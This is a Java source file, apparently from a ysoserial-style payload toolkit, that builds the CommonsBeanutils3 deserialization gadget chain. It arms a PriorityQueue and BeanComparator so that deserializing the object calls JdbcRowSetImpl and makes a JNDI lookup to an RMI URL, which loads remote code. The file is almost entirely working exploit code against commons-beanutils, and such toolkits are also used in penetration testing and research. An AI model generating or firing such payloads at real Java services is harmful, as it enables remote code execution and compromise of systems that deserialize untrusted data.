package com.ppp.chain.commonsbeanutils;

import com.ppp.JavaClassHelper;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import com.sun.rowset.JdbcRowSetImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.math.BigInteger;
import java.util.PriorityQueue;

/**
 * @author Whoopsunix
 */
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({Authors.FROHOFF})
@Sink({Sink.JNDI})
public class CommonsBeanutils3 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setSink(CommonsBeanutils3.class.getAnnotation(Sink.class).value()[0]);
        sinksHelper.setEnchant(EnchantType.DEFAULT);
        sinksHelper.setCommand("rmi://127.0.0.1:1099/ym759z");
        JavaClassHelper javaClassHelper = new JavaClassHelper();
        javaClassHelper.setExtendsAbstractTranslet(true);
        sinksHelper.setJavaClassHelper(javaClassHelper);

        PayloadRunner.run(CommonsBeanutils3.class, args, sinksHelper);

//        PayloadRunner.run(CommonsBeanutils3.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object url) throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName((String) url);
        jdbcRowSet.setMatchColumn("x");
        // mock method name until armed
        final BeanComparator comparator = new BeanComparator("lowestSetBit");

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "databaseMetaData");

        // switch contents of queue
        Reflections.setFieldValue(queue, "queue", new Object[]{jdbcRowSet, jdbcRowSet});

        return queue;
    }
}
